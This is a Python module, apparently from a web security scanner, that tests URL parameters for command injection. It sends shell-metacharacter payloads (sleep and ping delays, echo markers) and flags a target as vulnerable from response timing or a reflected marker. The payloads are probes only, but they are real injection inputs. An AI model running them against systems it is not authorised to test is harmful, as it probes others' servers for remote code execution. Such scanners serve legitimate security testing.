"""
modules/rce.py — Remote Code Execution / Command Injection detection
Tests shell metacharacters in common params.
"""
import time
from core.http import fetch

CMD_PARAMS = [
    "cmd", "exec", "command", "run", "query", "search", "ip",
    "host", "ping", "check", "tool", "arg", "args", "shell",
    "os", "system", "input", "data", "payload",
]

# Blind via time delay payloads (cross-platform)
TIME_PAYLOADS = [
    "; sleep 4 #",
    "| sleep 4",
    "& timeout 4",
    "` sleep 4 `",
    "; ping -c 4 127.0.0.1 ;",
    "| ping -n 4 127.0.0.1",
    "&& sleep 4 &",
    "\n sleep 4 \n",
]

# Reflected output payloads — look for echo in response
REFLECTED_PAYLOADS = [
    "; echo APEX_RCE_CONFIRM ;",
    "| echo APEX_RCE_CONFIRM",
    "& echo APEX_RCE_CONFIRM",
    "`echo APEX_RCE_CONFIRM`",
    "$(echo APEX_RCE_CONFIRM)",
    ";echo APEX_RCE_CONFIRM;",
    "\necho APEX_RCE_CONFIRM\n",
    "%0aecho%20APEX_RCE_CONFIRM",
]

CONFIRM_MARKER = "APEX_RCE_CONFIRM"


def generate_tasks(url, config):
    tasks = []
    extra_params = config.get("rce", {}).get("params", [])
    all_params = list(dict.fromkeys(CMD_PARAMS + extra_params))

    for param in all_params:
        for payload in REFLECTED_PAYLOADS:
            tasks.append({
                "url": url,
                "method": "GET",
                "params": {param: f"1{payload}"},
                "type": "Remote Code Execution",
                "rce_param": param,
                "vector": "reflected",
                "executor": test_rce_reflected,
            })
        for payload in TIME_PAYLOADS:
            tasks.append({
                "url": url,
                "method": "GET",
                "params": {param: f"1{payload}"},
                "type": "Remote Code Execution",
                "rce_param": param,
                "vector": "time-based",
                "time_payload": payload,
                "executor": test_rce_time,
            })
    return tasks


async def test_rce_reflected(session, task):
    try:
        text, resp = await fetch(session, task["url"], params=task["params"])
        if resp and text:
            vulnerable = CONFIRM_MARKER in text
            return {
                "type": "Remote Code Execution",
                "url": task["url"],
                "params": task["params"],
                "vulnerable": vulnerable,
                "severity": "Critical" if vulnerable else "Info",
                "vector": "reflected-output",
                "evidence": CONFIRM_MARKER if vulnerable else "",
                "owasp_category": "A03:2021 – Injection",
            }
    except Exception as exc:
        return {"type": "Remote Code Execution", "url": task["url"], "error": str(exc), "vulnerable": False}
    return {"type": "Remote Code Execution", "url": task["url"], "vulnerable": False}


async def test_rce_time(session, task):
    try:
        url = task["url"]
        param = task["rce_param"]
        # Baseline
        t0 = time.perf_counter()
        await fetch(session, url, params={param: "1"})
        baseline = time.perf_counter() - t0
        # Payload
        t1 = time.perf_counter()
        await fetch(session, url, params=task["params"])
        delayed = time.perf_counter() - t1
        # Confirm if delayed at least 2.5s more than baseline
        threshold = max(baseline * 2.5, 0.3) + 2.0
        vulnerable = delayed >= threshold and delayed > baseline + 2.0
        return {
            "type": "Remote Code Execution",
            "url": url,
            "params": task["params"],
            "vulnerable": vulnerable,
            "severity": "Critical" if vulnerable else "Info",
            "vector": "time-based",
            "timings": {"baseline_s": round(baseline, 3), "payload_s": round(delayed, 3)},
            "owasp_category": "A03:2021 – Injection",
        }
    except Exception as exc:
        return {"type": "Remote Code Execution", "url": task.get("url"), "error": str(exc), "vulnerable": False}
